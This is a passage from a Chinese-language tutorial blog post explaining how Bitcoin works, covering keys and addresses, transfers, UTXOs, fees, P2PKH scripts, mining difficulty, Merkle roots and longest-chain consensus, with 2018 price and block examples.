alt=""></p><p>有了比特币钱包之后，你需要做的就是动动手指，点一下就开好账户了，再点一下又开好了一个账户。</p><p>一个账户由一对密钥（私钥，公钥）组成，公钥可以通过私钥生成。再使用公钥经过一系列不可逆的哈希计算得到比特币账号地址。</p><pre><code>小知识：什么是哈希计算？哈希(hash)计算具有如下特点:1、将任意长度的数据映射为固定长度的大整数；2、数据有任意变化后，计算出来的结果完全不同；3、无法通过哈希结果逆推出原始数据内容。哈希算法有很多种实现，比如常见的 SHA-256 算法：sha256(&apos;123&apos;) = a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3sha256(&apos;234&apos;) = 114bd151f8fb0c58642d2170da4ae7d7c57977260ac2cc8905306cab6b2acabc...可见这里：哈希值是用 16 进制表示的整数；原始内容轻微变化，但哈希结果差之千里，那么每次改动原始内容，得到的哈希值相当于从 1 到 2的256次方 中随机抽一个数。</code></pre><p>所谓“不可逆”就是：别人无法通过账号地址推算出公钥。所以，你可以放心的把地址告诉别人，接受对方的转账。下图展示了通过公钥计算出比特币地址的过程：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/10/160e077bfa0945c7" alt=""></p><p>你很兴奋，因为有了第一个属于自己的比特币账户，但是也很沮丧，因为里面空空如也。</p><p>那么怎样让自己的钱包鼓起来？毕竟一个比特币价值 $17082！</p><pre><code>小知识：比特币冷笑话为什么前文提到比特币价值 1btc = $14907，这里又变成了 $17082？因为比特币交易价格剧烈波动，在作者写到这里的时候，已经过了 10 分钟。^_^</code></pre><p>已知的获取比特币的方式和存在的障碍：</p><p>1、比特币“挖矿”；（竞争很激烈，机会很渺茫）</p><p>2、接受比特币支付，比如你的工资/咖啡店；（你的老板/顾客也没有比特币）</p><p>3、让你的好朋友给你转一点；（你可能没有好到这种程度的朋友 ^_^）</p><p>4、花钱到比特币交易所购买。（国内已经禁止比特币交易，另外价格也已经突破 $10000 美元）</p><p>那普通人不是没有机会参与了么？</p><p>你说对了，目前参与门槛已经非常高了。这是比特币发展必然要经历的一个过程，也许等到“矿工”们愿意花费他们手中的比特币，也有足够的机构和个人愿意接受比特币支付了，比特币才会通过价值流动慢慢到达普通人手中。</p><p>根据 btc.com 统计的全球前十大比特币账户下的余额：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/9/160dadd19f95721a" alt=""></p><p>第一名的价值已经超过 26亿 美金！</p><p>这就是技术变革给先行者最好的奖励！“拥抱变化”不是一句空谈。</p><p>当然，这里可能有一些是比特币交易所的公共账户。</p><pre><code>小思考：批评人士也认为，目前的比特币不能给大众带来普惠。狂热的炒作只是一个庞氏骗局，泡沫终将破灭。你怎么看？</code></pre><blockquote><p>[新闻链接] 人民日报：<a href="http://paper.people.com.cn/rmrb/html/2018-01/03/nw.D110000renmrb_20180103_2-22.htm" target="_blank" rel="noopener">《比特币价格存在泡沫，已是一个无需讨论的问题》</a></p></blockquote><h3 id="转账是如何实现的"><a href="#转账是如何实现的" class="headerlink" title="转账是如何实现的"></a>转账是如何实现的</h3><p>假设 Mr.Chen 在国外，通过 coinbase.com 比特币交易所，用美元向他人购买了 0.1 个比特币。</p><pre><code>小知识：比特币最小单位就像 1元 = 10角 = 100分 一样，1btc 也可以细分：1btc = 100000000聪（没错，是1亿，也是中本聪那个聪）也即：1聪 = 0.00000001btc所以，当你以后听到：“2两葱多少钱？” “2聪” 这样对话的时候，不要惊讶。</code></pre><p>现在 Mr.Chen 想给 Miss.Liu 转 0.05个比特币，怎么实现呢？</p><p>想一下，你以前用银行卡的时候怎么转账：</p><ol><li>账户余额大于等于转账金额；</li><li>知道对方的账号；</li><li>输入密码，确认是本人操作。</li></ol><p>剩下的事情，银行会帮你搞定：扣掉你账户的金额，加到对方账户下，给你出账单等等，还可能会收你手续费。</p><p>比特币转账步骤类似，但是没有银行这个角色，就像你开比特币账户的时候不用带着材料跑去银行一样。</p><p>那么谁来扣钱、谁来记录账单呢？</p><p>答案是：分布式节点。</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/9/160db1218bf436b7" alt=""></p><pre><code>小知识：什么叫分布式？与分布式对应的是“中心化”，就像所有人的交易都由银行这个中心记录管理。如果银行服务器崩溃了，那么所有人的交易都无法再进行。相反，分布式就是所有交易由比特币网络中的节点共同记录。每个节点独立维护一份完整的交易账本，这个账本也叫做“分布式账本”。任何一个节点退出比特币网络，不影响系统运行。现在，比特币系统由分布在全球各地的节点组成。每个节点都与附近的节点连接，组成一张覆盖全球的 P2P 网络。这也是比特币可以全球流通的物质基础。</code></pre><p>所以，你只需将交易信息告诉比特币网络中任意节点就行。</p><p>它不仅会帮你记录到它的账本中，还会帮你转发给与之连接的近邻节点，通过这样病毒式扩散后，数分钟内交易信息将抵达全球每一个比特币节点。蔚为壮观！</p><p>那么节点在哪？看不见摸不着，我去哪里找它？</p><p>幸运的是，不用你费心去找节点，你的“比特币钱包”会帮你做这件事。</p><p>事实上，比特币钱包要把交易信息告诉节点，那么它就至少得连接比特币网络中的一个节点，当与节点连接后，比特币钱包本身也就成为了网络中的一个节点，只不过叫做“轻量级节点”，因为它既没有记录完整的账本，也没有去“挖矿”。</p><pre><code>小知识：比特币钱包都有哪些功能？1、管理比特币账户（密钥）；2、发送交易信息；3、查询余额。</code></pre><p>好奇的你还是想多问一句：比特币钱包是怎么发现节点的？</p><p>很简单，在比特币网络发展的过程中，会有一些长期稳定的节点，称为“种子节点”。</p><p>开发比特币钱包软件的时候，会把这些“种子节点”的域名写进代码，通过 DNS 动态查询的方式，向“种子节点”要一份活跃节点地址列表，以这些节点为媒介比特币钱包就可以加入网络了。</p><p>好极了！现在 Mr.Chen 通过比特币钱包给 Miss.Liu 完成转账了，这笔转账通过“分布式账本”被全球的比特币网络节点记录在案。</p><pre><code>转账记录：Mr. Chen -&gt; Miss. Liu : 0.05btc当然，不会真的这样记录名字，而是两人的比特币账号，类似于：1AC4fMwgY8j9onSbXEWeH6Zan8QGMSdmtA -&gt; 1JWq3G8pqCo6jZGhLHpctYap5yVScqGxkv : 0.05btc小思考：交易记录中没有任何隐私信息，即比特币交易的“匿名性”。那么，匿名交易的利与弊都有哪些？</code></pre><h3 id="节点为了什么而工作"><a href="#节点为了什么而工作" class="headerlink" title="节点为了什么而工作"></a>节点为了什么而工作</h3><p>那么谁来充当比特币网络中记账的“全节点”？为什么它们会那么好心，帮我记录交易信息呢？毕竟随着交易数量的增长，这个账本可不小。</p><p>自 2009 年比特币网络开始记账以来，账本已经接近 150G 大小：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/13/160ee7721e3e891d" alt=""></p><p>节点们并没有好心到“免费”帮你记账。</p><p>事实上，每一个节点都可能是“坏节点”，即使收到你发来的交易信息了，也不帮你记账！so bad ;(</p><p>那怎么办呢？</p><p>解决方案：每笔交易支付一笔“转账费”，谁愿意记账就可以获得这笔费用。</p><p>这样节点就有动力收集全网的交易信息，真是“有钱能使鬼推磨”。</p><pre><code>带转账费的交易：Mr. Chen -&gt; Miss. Liu : 0.05btcMr. Chen -&gt; 某 “矿工” : 0.001btc</code></pre><p>我们说过，交易会被全球比特币网络节点记录在案，那么“转账费”是它们均分么？节点那么多，平均下来也太少了，起码我不干。</p><p>当然不会均分，而是谁先完成“挖矿”，这笔费用就归谁，也就是跟系统奖励一起给他，赢者通吃！</p><p>这也是节点被称为“矿工”的原因，勤勤勉勉的记账，辛辛苦苦的付出计算成本，最后得到转账费+系统奖励。</p><p>那其他节点不乐意了，没有收到小费凭什么要我记录？</p><p>解决方案：“挖矿”是每 10 分钟一次，虽然这次你没挖着，没了奖励也没了转账费，但是可以开始下一轮竞赛了啊，不过参加下一轮竞赛的前提是，你得把账本更新到最新，也就是你不记账就失去了继续竞赛的资格。</p><p>“好吧，我们愿意接着干”，节点们心有不甘地说道。</p><h3 id="我的钱归我"><a href="#我的钱归我" class="headerlink" title="我的钱归我"></a>我的钱归我</h3><p>你已经知道，只需向比特币网络广播一次交易信息，就会被全网的节点记录在案。</p><p>假如有个坏人 HR ，他知道你的账号是 A，那么他广播一条交易信息：</p><pre><code>A -&gt; HR : 10btc</code></pre><p>那你的钱不就被他转走了吗？</p><p>并不会。</p><p>比特币节点接收到一条交易信息后，会独立进行真实性校验，如果有误就不会入账：</p><ol><li>账户余额是否足够；</li><li>是否本人发起交易。</li></ol><p>对于余额查询，我们前文说过，比特币系统的分布式账本并不直接记录某个账户下有多少余额，而是只记录转账记录。“挖矿”奖励所得也相当于一次系统给“矿工”的转账。</p><p>假设你账户 A 如下，有“挖矿”所得及 X/Y/Z 三人给你转账，共 50btc：</p><pre><code>记录1：  -&gt; A : 12.5btc记录2：X -&gt; A : 12.5btc记录3：Y -&gt; A : 20btc记录4：Z -&gt; A : 5btc</code></pre><p>显然，你还没花出去。</p><p>在比特币系统中，这 4 笔转账记录的输出部分也叫做“未花费交易输出” (Unspent Transaction Output 缩写为：UTXO)。</p><p>UTXO 不可分割，只能以整体作为一笔新交易的输入。</p><p>就像你不能把1元硬币割成两块，分别作为5毛钱一样。如果你要给商户支付5毛，只能给他1元，然后找回你5毛。</p><p>现在，你想给 B 转账 22btc，你只能从这 4 个 UTXO 中挑几个，如果刚好可以凑齐 22btc 最好，否则只能选大于 22btc 的组合。</p><p>就像你钱包有 10元/5元/2元/1元 各一张，买地铁票需要 3元，那么你可以给 ￥2+￥1 的组合，也可以给 ￥5 找回 ￥2，甚至可以给 ￥10 找回 ￥7，随你意。</p><p>经过反复斟酌，你挑选了这 2 个 UTXO：</p><pre><code>记录3：Y -&gt; A : 20btc记录4：Z -&gt; A : 5btc</code></pre><p>这就是你准备发起的新交易的输入部分，总共 25btc。等到交易被确认之后，它们会被从 UTXO 记录中移除 ，也就不能再作为另一笔交易的输入了。</p><p>输出分为两部分，一个是给 B 转账 22btc，另一个是给自己转账 2.5btc：</p><pre><code>记录5：A -&gt; B : 22btc记录6：A -&gt; A : 2.5btc</code></pre><p>给自己转账也叫作“找零”。</p><p>可是：</p><pre><code>25btc - 22btc = 3btc</code></pre><p>怎么只“找零”了 2.5btc？</p><p>为什么 0.5btc 神秘消失了？是因为人性的扭曲还是道德的沦丧？</p><p>是因为隐性的“转账费”。</p><p>当记录交易的节点发现一笔交易的输入大于输出的时候，他就知道：</p><pre><code>转账费 = 输入 - 输出</code></pre><p>那转账费给多少合适呢？</p><p>答案是：随意，而且交易费和交易额无关，只和交易数据大小有关。费用越高，你的交易就越快地被记录。</p><p>幸运的是，挑选 UTXO 组合和计算转账费的工作都有“比特币钱包”帮你搞定，对你来说只需关注：给谁转了多少、找零多少、费用多少。</p><pre><code>小思考：不给转账费会怎样？当传统的银行都开始取消转账费的时候，比特币还在收费，有点过分。这也是批评人士诟病比特币的缺陷之一。事实上，转账费是为了鼓励节点参与到系统的维护。传统银行系统也有巨额的维护成本，只不过他们转移了收费方式，毕竟“羊毛出在羊身上”。即使你不交转账费，交易也可能被顺利记录，因为网络中有一些“热情的”节点。只不过不能那么及时可以确认转账成功。</code></pre><p>现在，你已经知道，一笔交易由输入和输出组成。输入由多个 UTXO 组成，输出由转出额以及可选的找零、交易费组成。</p><p>所以，当你挑选的 UTXO 组合小于转出额的时候，被判定为：余额不足，交易无效。</p><p>节点会给你的比特币钱包返回错误提示，也不会再把这个交易信息转发给近邻节点。</p><p>这样就杜绝了舞弊者：给人开空头支票。</p><p>另一个问题：如何确认是账户所有者本人操作？</p><p>上文说到，你的账户 A 在给 B 转账 22btc 之前，有 4 笔 UTXO：</p><pre><code>记录1：  -&gt; A : 12.5btc记录2：X -&gt; A : 12.5btc记录3：Y -&gt; A : 20btc记录4：Z -&gt; A : 5btc</code></pre><p>事实上，每笔 UTXO 都带有转账方为 A 量身打造的的“锁定脚本”（scriptPubKey），A 想要花费这笔 UTXO 的话必须提供“解锁脚本”（scriptSigs）。</p><p>“解锁脚本”和“锁定脚本”拼接在一起，可以组成一段可执行代码。如果执行成功，那么解锁成功，解锁者可以花费这笔 UTXO，否则记账节点在验证交易的时候认为他没有权限操作。</p><p>相当于转账者用你提供的一把锁，锁住了 UTXO，只要你能提供钥匙解锁，就可以花费。</p><p>那么“脚本”长啥样？</p><pre><code>锁定脚本：DUP HASH160 PUSHDATA(&lt;public-key-hash&gt;) EQUALVERIFY CHECKSIG解锁脚本：PUSHDATA(&lt;signature&gt;) PUSHDATA(&lt;public-key&gt;)拼接 &lt;解锁脚本&gt; &lt;锁定脚本&gt; 得到：PUSHDATA(&lt;signature&gt;) PUSHDATA(&lt;public-key&gt;) DUP HASH160 PUSHDATA(&lt;public-key-hash&gt;) EQUALVERIFY CHECKSIG</code></pre><p>看起来很复杂，其实就是一条条指令：</p><p>步骤一 PUSHDATA(signature)：</p><p>把解锁者提供的签名 signature 压入栈顶；</p><p>步骤二 PUSHDATA(public-key)：</p><p>把解锁者提供的公钥 public-key 压入栈顶；</p><p>此时，栈内有两个数据：</p><table><thead><tr><th style="text-align:center">栈</th></tr></thead><tbody><tr><td style="text-align:center">public-key</td></tr><tr><td style="text-align:center">signature</td></tr></tbody></table><p>步骤三 DUP：</p><p>将栈顶数据复制一份；</p><table><thead><tr><th style="text-align:center">栈</th></tr></thead><tbody><tr><td style="text-align:center">public-key</td></tr><tr><td style="text-align:center">public-key</td></tr><tr><td style="text-align:center">signature</td></tr></tbody></table><p>步骤四 HASH160：</p><p>将栈顶数据使用 HASH160 哈希算法加密；</p><table><thead><tr><th style="text-align:center">栈</th></tr></thead><tbody><tr><td style="text-align:center">public-key-hash</td></tr><tr><td style="text-align:center">public-key</td></tr><tr><td style="text-align:center">signature</td></tr></tbody></table><p>步骤五 PUSHDATA(public-key-hash) ：</p><p>将锁定者提供的 public-key-hash 加入栈顶；</p><table><thead><tr><th style="text-align:center">栈</th></tr></thead><tbody><tr><td style="text-align:center">public-key-hash</td></tr><tr><td style="text-align:center">public-key-hash</td></tr><tr><td style="text-align:center">public-key</td></tr><tr><td style="text-align:center">signature</td></tr></tbody></table><p>步骤六 EQUALVERIFY：</p><p>判断栈顶2个元素是否相等，相等的话就移除；</p><table><thead><tr><th style="text-align:center">栈</th></tr></thead><tbody><tr><td style="text-align:center">public-key</td></tr><tr><td style="text-align:center">signature</td></tr></tbody></table><p>步骤七 CHECKSIG：</p><p>使用栈顶的公钥 public-key 解密签名 signature，能够解密的话，执行成功；</p><table><thead><tr><th style="text-align:center">栈</th></tr></thead><tbody><tr><td style="text-align:center"></td></tr><tr><td style="text-align:center">成功</td></tr></tbody></table><p>这些步骤只有一个目的：证明 A 是这笔 UTXO 的所有者。</p><p>“锁定脚本”中包含的 public-key-hash 就是 A 的公钥哈希（注意：不是公钥），可以通过 A 的比特币地址解码出来。</p><p>所以，我们说知道对方的比特币地址就可以给对方转账，实质上是知道对方的 public-key-hash 从而可以制造“锁定脚本”，也就是所谓的 P2PKH(Pay-To-Public-Key-Hash)。</p><p>A 想要花费一笔 UTXO 的时候，需要提供“解锁脚本”，包含他的公钥(public-key)和对新建交易的签名(signature)。</p><p>签名是通过 A 的私钥对交易信息加密生成的：</p><pre><code>签名(signature) = 私钥::加密(交易信息)</code></pre><p>前文说到，私钥加密的信息只有对应的公钥能解密。言下之意，如果一段密文可以用公钥解密出来，那么这段密文肯定是对应的私钥所有者亲手加密的，因为私钥只存在所有者手中。</p><p>用私钥对一份数据加密，生成密文的过程，被形象地称为“签名”。就像你在一份合同上签名后就不可抵赖，因为没人可以写出你那样的笔迹。</p><p>用私钥对交易信息签名完成后，就相当于宣告：</p><ol><li>这是你本人行为；</li><li>任何人无法篡改交易信息，因为签名是对原始信息的加密，如果信息有变动，那么用你的公钥解密出原始内容后，就可以比对发现差异。</li></ol><p>综上所述，将一笔 UTXO 作为交易的输入部分而花费的时候，你需要提供一段“解锁脚本”，包含有你的私钥加密后的签名。</p><p>当你把交易信息广播给节点的时候，节点会进行真实性校验：</p><ol><li>确认存在这样一笔 UTXO；</li><li>将你提供的“解锁脚本”和 UTXO 携带的“锁定脚本”组合成一段代码并执行；</li><li>代码执行过程的本质就是确认你是这笔 UTXO 的所有者，是你本人准备花费它，而且交易信息在网络传输过程中没有被篡改过。</li></ol><p>至此，“转账是本人操作”的问题已经解决。</p><pre><code>小知识：智能合约(smart contract)的概念也就是从上述“脚本”代码执行过程衍生出来的。所谓“智能”指的是：当条件满足时，代码可以顺利执行。比特币系统对“脚本”的设计是开放的。上述 P2PKH 的执行过程，只要你能提供私钥就可以花费 UTXO。事实上，你可以设计为：3 人中有 2 个人提供私钥，代码就可以顺利执行。这就相当于，你把比特币账户交给 3 人共同保管，有 2 人达成协议就可以花费。</code></pre><h3 id="达成共识"><a href="#达成共识" class="headerlink" title="达成共识"></a>达成共识</h3><p>遍布全球的比特币网络节点各自独立工作，随时有节点退出或者加入，怎么保证最终大家记录的账本一致，或者说达成共识呢？</p><p>先看看账本长啥样。</p><p>假设某节点 Node 在 10 分钟内接收到 3 笔经过合法校验的交易：</p><pre><code>交易1：A -&gt; B交易2：C -&gt; D交易3：E -&gt; F</code></pre><p>节点会计算每笔交易的输入减去输出的差额，也就是前文所说的“隐性的转账费”。</p><p>假设每笔交易包含的转账费都是 0.1btc，那么总共就有 0.3btc。</p><p>再加上当前时段的系统奖励 12.5btc，那么节点将会得到：</p><pre><code>12.5btc + 0.3btc = 12.8btc</code></pre><p>节点会构造一笔系统给自己的转账，加入到交易列表：</p><pre><code>交易0：  -&gt; Node (12.8btc)交易1：A -&gt; B交易2：C -&gt; D交易3：E -&gt; F</code></pre><p>这笔交易也叫作 coinbase transaction，是对节点辛苦记账的奖励。</p><p>接下来，节点以这些交易列表为基础，构造出一个区块头，共同组成一个完整的区块。</p><p>其中，区块头主要包含以下信息：</p><table><thead><tr><th style="text-align:center">区块头结构</th><th style="text-align:center">简介</th></tr></thead><tbody><tr><td style="text-align:center">版本号</td><td style="text-align:center">不同版本的区块适用不同版本的校验规则</td></tr><tr><td style="text-align:center">上一个区块头的哈希值</td><td style="text-align:center">链接上一个区块，从而在区块之间形成“链条”</td></tr><tr><td style="text-align:center">交易列表的 Merkle Root</td><td style="text-align:center">由交易列表数据通过一定规则生成</td></tr><tr><td style="text-align:center">时间戳</td><td style="text-align:center">构造区块头的时间点</td></tr><tr><td style="text-align:center">难度目标值</td><td style="text-align:center">区块头的哈希值要小于难度目标值</td></tr><tr><td style="text-align:center">随机数</td><td style="text-align:center">不断调整以改变区块头内容，使得区块头的哈希值满足特定要求</td></tr></tbody></table><p>可以使用区块链浏览器查询每个区块的数据内容，以下是通过 btc.com 查询到的高度为 503688（也就是第 503688 个区块）的区块信息：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/11/160e5add7ef1d9dd?imageslim" alt=""></p><p>可以直观的看到，区块分为区块头和交易列表两部分。</p><pre><code>为了方便浏览，有一些并不在区块头中实际存储的信息，也被展示出来了。比如：区块自身的哈希值、后一个区块哈希值等。</code></pre><p>那么区块头的各个字段都是如何确定内容的呢？</p><p><em>版本号</em></p><p>比特币协议会不断发展以适应新的需求，不同的版本有不同的规则，可以通过版本字段标示这个区块适用哪些规则。</p><p><em>上一个区块头的哈希</em></p><p>根据上一个区块头内容计算出来的哈希值。</p><p>这里有个递归的问题：构造区块头需要上一个区块的信息，那么同理，上一个区块在被构造出来的时候需要上上一个区块的信息….</p><p>解决方案：创世区块，也就是第 0 个区块，不需要上一个区块的信息。</p><p>下图展示了创世区块(Genesis Block)的数据结构，可以看到它没有上一个区块头的哈希值，同时也没有交易记录，只有一笔系统奖励的 50btc：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/11/160e5c59ad7cad36" alt=""></p><p>有了创世区块问题就解决了，下一个区块可以指向创世区块，从此子子孙孙无穷尽也。</p><p><em>Merkle Root</em></p><p>Merkle Root 美国计算机科学家 Ralph Merkle 最早提出，并由他冠名的一种数据处理过程。</p><p>例如，对于排好序的 4 份数据 L1/L2/L3/L4，分别计算它们的哈希值，然后将哈希值两两合并再计算哈希值，直至最后剩下一个根节点：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/12/160ea45968bffbf1" alt=""></p><p>上图看起来就像一棵不断分叉的树，最底层的称为叶子(leaf)节点，最顶部的称为 Merkle Root。</p><p>这种数据结构具有特点：任意叶子节点的数据变化，都会沿着箭头向上传递，最终导致 Merkle Root 也发生变化。</p><p>将这种处理方法应用到区块的交易列表数据上，把每笔交易作为叶子节点，就可以计算出区块头所需要的 Merkle Root。</p><p><em>时间戳</em></p><p>区块头被构造出来的时间点。</p><p>例如，创世区块是在 2009-01-04 02:15:05 被构造出来的。</p><p><em>难度目标值</em></p><p>上文说到，比特币网络设置了“挖矿”难度，保证不管全网算力增加还是减少，都让“挖矿”时间保持在 10 分钟左右。</p><p>每经过 2016 个区块，难度就会调整一次。如果平均时间大于 10 分钟，那么降低难度；如果平均时间小于 10 分钟，那么增大难度。</p><p>下图是对数化处理后的难度变化曲线，可以看到从 2010 年 2 月开始难度剧烈增加（对数化处理后才能在图表内展示完整，所以看起来平缓）：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/11/160e5d246884e60c" alt=""></p><p>比特币协议要求构造出来的区块头的哈希值小于难度目标值，否则区块无效：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">hash</span><span class="params">(block-header)</span></span> &lt; difficulty-target</span><br></pre></td></tr></table></figure><p>这个构造过程也称为“工作量证明”(Proof of Work)，因为不花费一定时间投入算力的话，就不能构造出符合条件的区块头。那么构造成功的话也就证明了投入的工作量。</p><p>在区块头中，有 4 个字节的长度存储编码后的难度目标值，以第 503829 个区块的难度目标值为例：</p><pre><code>0x180091c1</code></pre><p>这串 16 进制表示的数据分为 0091c1 和 18 两部分，经过固定公式计算后，可以得到难度目标值：</p><pre><code>0x0091c1 * 2^(8*(0x18 - 3)) = 0x00000000000000000091c1000000000000000000000000000000000000000000</code></pre><p>可以看到难度目标值是一个 16 进制表示的整数。</p><p>计算区块头哈希值的算法把区块头内容也映射为一个 16 进制表示的整数，例如第 503829 个区块头的哈希值：</p><pre><code>hash(block.503829) = 0x000000000000000000304f4c17301acc6bb0990c3791db64d642ae5868158038</code></pre><p>通过对比可以发现，区块头哈希值小于难度目标值：</p><pre><code>区块哈希值:0x000000000000000000304f4c17301acc6bb0990c3791db64d642ae5868158038难度目标值:0x00000000000000000091c1000000000000000000000000000000000000000000</code></pre><p>所以这个区块是合法的。</p><p>我们知道哈希计算是单向的，也就是没有办法通过哈希值推算出原始内容。</p><p>只能通过不断地变化原始内容，然后计算出哈希值，看看是否符合小于难度目标值的要求。</p><p>这是一个费时的工作，大约需要 10 分钟。虽然“挖矿”设备计算速度超快，但是需要尝试的次数实在是太多了！</p><p>例如，到底要尝试多少次，才能获得小于下列难度目标值的哈希呢？</p><pre><code>0x00000000000000000091c1000000000000000000000000000000000000000000</code></pre><p>相当于前文说到的在 1 到 2的256次方 之间随机抽一个数，使其小于等于这个难度目标值。</p><p>那么平均要计算：</p><pre><code>8.29 x 10^21 次 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff/0x00000000000000000091c1000000000000000000000000000000000000000000如果你的计算机每秒可以计算 10 亿次的话，那么需要：8.29*10^21/1000000000/3600/24/365 = 26万年得等到天荒地老！</code></pre><p>确实有难度。</p><p>所以前文说到；个人计算设备参与“挖矿”机会很渺茫。</p><p>现在你已经知道：难度目标值的存在，使得构造一个有效的区块相当费时费力。</p><p>这也是前文所说的：人为制造“挖矿”成本。</p><p>那么如何确认构造当前区块需要的难度目标值呢？</p><p>答案是：每构造完 2016 个区块，有一次调整的机会，根据过去的 2016 块消耗的平均时间，用固定的规则计算出新的难度目标值。</p><p>还是有递归的问题，所以创世区块的难度目标值只能人为设定。事实上，初始难度目标值由中本聪写在第一版比特币代码中：</p><pre><code>0x00000000ffff0000000000000000000000000000000000000000000000000000</code></pre><p>平均需要计算：</p><pre><code>4295032833 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff/0x00000000ffff0000000000000000000000000000000000000000000000000000约 43 亿次，相当轻松</code></pre><p>以这个为难度系数 1 的话，截至目前，难度系数已经达到：</p><pre><code>1.93x10^12 (1.93T) = 0x00000000ffff0000000000000000000000000000000000000000000000000000 / 0x00000000000000000091c1000000000000000000000000000000000000000000</code></pre><p>难度系数(difficulty)是相对值，表征当前相对于第一次，构造一个有效区块有多难。</p><p>难度目标值(target)是实现这个难度的具体阈值，要求构造的区块头的哈希小于这个数。</p><p>下图展示了最近几次的难度变化：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/12/160e9aac711c1507" alt=""></p><p>可见，难度有涨有跌，涨多跌少，这也表明加入“挖矿”大军的算力总体上在不断增加。</p><p>根据过去 2016 个区块的平均生成时间和难度目标值，就可以计算出接下来 2016 个区块的难度目标值：</p><pre><code>新难度目标值 = 过去难度目标值 * (过去平均分钟时间 / 10)例如：当前难度目标值为 0x180091c1，解码后：0x00000000000000000091c1000000000000000000000000000000000000000000过去 2016 块平均出块时间为 8.7 分钟那么新的难度目标值：0x00000000000000000091c1000000000000000000000000000000000000000000 * (8.7 / 10)= 0x0000000000000000007e578c0000000000000000000000000000000000000000转码后记为：0x177e578c</code></pre><p><em>随机数</em></p><p>前文说到，为了让区块头的哈希值满足条件，必须不断地变化区块头内容，但是区块头的其他部分都是固定的，所以只能调整区块头的随机数字段。</p><p>事实上，这个字段有 4 字节长度，可以表示：</p><pre><code>0 到 4,294,967,295</code></pre><p>所以，随机数字段(Nonce:Number use Once) 从 0 开始遍历，可以产生约 43 亿个不同的值，也就可以生成 43 亿个不同的哈希，只要有一个哈希满足条件了，区块头构造工作就实现了。</p><p>不过，随着全网算力的不断攀升，43 亿次计算根本不够难度要求。</p><p>前文说到，普通交易需要在输入部分提供“解锁脚本”，用于花费 UTXO ，但是“矿工”自己构造的系统奖励+转账费的那笔交易(coinbase transaction)并不需要指定 UTXO ，所以不用写入“解锁脚本”。这里空出来的地方可以写入多达 100 字节的任何数据。</p><p>交易列表的每次变动会导致区块头中的 Merkle Root 也发生变化，从而保证足够多次的哈希尝试。</p><p>以创世区块为例，虽然当时随机数字段足够满足哈希尝试次数，但是中本聪依然在 coinbase transaction 写入了这句话：</p><blockquote><p>The Times 03/Jan/2009 Chancellor on brink of second bailout for banks</p><p>(泰晤士报 2009年1月3号 财政大臣准备再次对银行施以援手)</p></blockquote><p><img src="https://user-gold-cdn.xitu.io/2018/1/12/160ea10ee36bfca6" alt=""></p><p>这句话既证明了创世区块诞生于 2009 年 1 月 3 号 之后，又表达了对银行(传统货币体系)的讽刺和创造比特币系统的初衷，还示范了 coinibase transaction 字段的扩展性用法。</p><p>现在你已经知道构造区块头需要的所有数据，以及如何获取到这些数据，回顾一下：</p><pre><code>1、节点收集 10 分钟内全网有效的交易信息；2、插入一笔包含交易费和系统奖励的交易信息；3、将交易列表排好顺序，计算出 Merkle Root 写入区块头；4、找到上一个区块，并计算出它的区块头哈希值写入区块头；5、获取当前难度目标值；6、不断调整随机数和 coinbase transaction 扩展字段，使得区块头的哈希值满足要求。</code></pre><p>这就是一次“挖矿”的全部过程。</p><p>所以，“挖矿”的本质就是记录交易并构造出一个满足条件的区块。</p><p>从创世区块开始，每 10 分钟左右全网发生的交易被打包进一个区块，每个区块都包含上一个区块头的哈希值，从而在块与块之间形成“链条”，这就是所谓的“区块链”：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/12/160ea9155eec7149" alt="区块链"></p><p>区块链便是上文所说的“分布式账本”的真实面貌。</p><p>现在的问题是：如何让所有节点记录的区块链保持一致？</p><p>每个节点是独立开展工作的，只打包自己接收到的交易信息，同时会插入给自己的奖励交易，那最后岂不是每人一条自己的区块链？</p><p>毕竟自己构造的区块才包含给自己的奖励，谁也不愿意放弃。</p><p>为了让这群“自私”的节点保持一致，比特币协议规定：</p><p><strong>系统中只有最长的那条区块链是有效的</strong></p><p>这会导致两个结果：</p><pre><code>1、节点成功构造出区块后，除了加到自己的链尾，还会第一时间广播给全网节点；2、其他节点收到一个有效区块后，会第一时间加入到自己的区块链上，同时也就宣布自己放弃这一轮的“挖矿”了。</code></pre><p>第 1 个结果是显而易见的，把好不容易构造出来的区块藏着掖着，对自己没有任何好处。</p><p>倒不如发给更多人，反正它们无法篡改，让它们加到链尾，那么你的区块所在的链条长度又 +1 了，这样就巩固了“系统中最长的区块链”的地位，你才可以认为系统奖励安心落袋了。</p><pre><code>小思考：为什么其他节点无法篡改你的区块？篡改的主要目标是交易记录，比如把系统奖励改到自己名下。这就会导致 Merkle Root 发生变化，那么区块头的哈希值也跟着变化。那就不再是一个有效的区块了，毕竟区块头的哈希值必须小于难度目标值。</code></pre><p>第 2 个结果充分运用了博弈的原理，假设你收到一个别人发过来的有效区块，你最佳的选择就是马上把它加到自己的区块链上，因为你不知道其他节点会不会加到它们的链尾，如果它们加了而你没加，那你的链条就比人短，导致你记录的整个链条作废！</p><p>那么摆在你面前的只有两个选项：放弃这一轮“挖矿”，开始下一个区块的构造；或者等着自己的链条作废。“利欲熏心”的你应该不难做出选择，毕竟没人跟钱过不去。</p><p>至此，“自私”的节点在有效规则之下做到了大规模协同，让系统利益最大化：只保持同一条最长的区块链。这也叫做“达成共识”。</p><p>但世界上没有完美的规则。</p><p>假设 A/B 两个节点在同一时刻成功构造区块并广播出去，全网节点中有一半先收到 A 的区块后收到 B 的区块，另一半先收到 B 的区块后收到 A 的区块。</p><p>节点会把先后收到的两个区块都接入链尾，以先收到为主链，后收到的为候选链，并开始以主链为基础继续下一轮“挖矿”。</p><p>节点们都按照规则办事，但此时出现了两条“最长的区块链”：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/12/160eacb8bf5a6827" 